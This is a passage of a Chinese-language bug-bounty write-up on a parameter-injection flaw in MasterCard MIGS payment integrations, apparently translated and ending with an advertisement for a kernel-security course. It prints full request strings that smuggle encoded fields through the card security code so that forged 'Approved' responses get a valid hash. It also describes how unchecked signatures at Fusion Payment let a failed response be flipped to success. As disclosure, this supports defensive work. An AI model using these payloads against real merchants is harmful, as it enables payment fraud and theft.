
为了利用这个bug，我们需要构造一个字符串，是一个有效的请求，同时是也是可以有效的获得MIGS返回。我们无需连接到MIGS服务器，只需要强制客户端签名它们自己的数据。

一个基本的请求如下：

```
vpc_AccessCode=9E33F6D7&vpc_Amount=25&vpc_Card=Visa&vpc_CardExp=1717&vpc_CardNum=4599777788889999&vpc_CardSecurityCode=999&vpc_OrderInfo=ORDERINFO&vpc_SecureHash=THEHASH&vpc_SecureHashType=SHA256
```

一个基本的返回如下：

```
vpc_Message=Approved&vpc_OrderInfo=ORDERINFO&vpc_ReceiptNo=722819658213&vpc_TransactionNo=2000834062&vpc_TxnResponseCode=0&vpc_SecureHash=THEHASH&vpc_SecureHashType=SHA256
```

在Fusion 支付的问题中，该利用是通过注入`vpc_CardSecurityCode(CVV)`来实现的

```
vpc_AccessCode=9E33F6D7&vpc_Amount=25&vpc_Card=Visa&vpc_CardExp=1717&vpc_CardNum=4599777788889999&vpc_CardSecurityCode=999%26vpc_Message%3DApproved%26vpc_OrderInfo%3DORDERINFO%26vpc_ReceiptNo%3D722819658213%26vpc_TransactionNo%3D2000834062%26vpc_TxnResponseCode%3D0%26vpc_Z%3Da&vpc_OrderInfo=ORDERINFO&vpc_SecureHash=THEHASH&vpc_SecureHashType=SHA256
```

对于这个字符串，客户端/支付网关将产生正确的HASH。

现在，我们可以POST这些数据给客户端自身（没有去MIGS服务器），但是我们轻微的改动，使得客户端可以读取到正确的值，（大部分客户端只检查`vpc_TxnResponseCode`和`vpc_TransacationNo`）:

```
vpc_AccessCode=9E33F6D7%26vpc_Amount%3D25%26vpc_Card%3DVisa%26vpc_CardExp%3D1717%26vpc_CardNum%3D4599777788889999%26vpc_CardSecurityCode%3D999&vpc_Message=Approved&vpc_OrderInfo=ORDERINFO&vpc_ReceiptNo=722819658213&vpc_TransactionNo=2000834062&vpc_TxnResponseCode=0&vpc_Z=a%26vpc_OrderInfo%3DORDERINFO&vpc_SecureHash=THEHASH&vpc_SecureHashType=SHA256
```

注意：

1. 这个和之前的数据一样被HASH。

2. 客户端不检查`vpc_AccessCode`和它的值。

3. 客户端只检查`vpc_TxnResonseCode`等，同时假设交易是有效的。

可以说，这个是MIGS客户端的bug，但是是MasterCard哈希方法的选则导致这个问题的产生，一旦value被encoded，则该bug将不可能被利用。

## 支付网关中的问题

额外提一下：即使支付网关负责处理金钱事务，但是并没有人们想想的那么安全。在我的pentest中，我发现多个支付协议设计上的问题。不幸的是，我无法在此处详细介绍。同时还发现了在实现上的一些问题。比如，Hash长度扩展攻击，XML 签名验证错误等。

在Fusion Payment中，一个bug是，他们甚至没有检查MIGS的签名。即意味着，我们可以随意修改MIGS返回的数据，同时标注交易成功。只需要简单的将一个字符从F（false）改为o（success）。故基本上，我们只需要输入任意的信用卡号，获取一个失败的MIGS相应，修改为成功，则支付就成功了。这是一个 2千万USD的公司，对于这个bug我却只得到了400 USD。

这并不是唯一有这个问题的支付网关，在我的pentest中，我在另一个payment中也发现了同样的问题。

## 结论

支付网关并没有你想的那么安全。同时如此低的赏金，我怀疑有多少人已经开始利用了这些问题。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
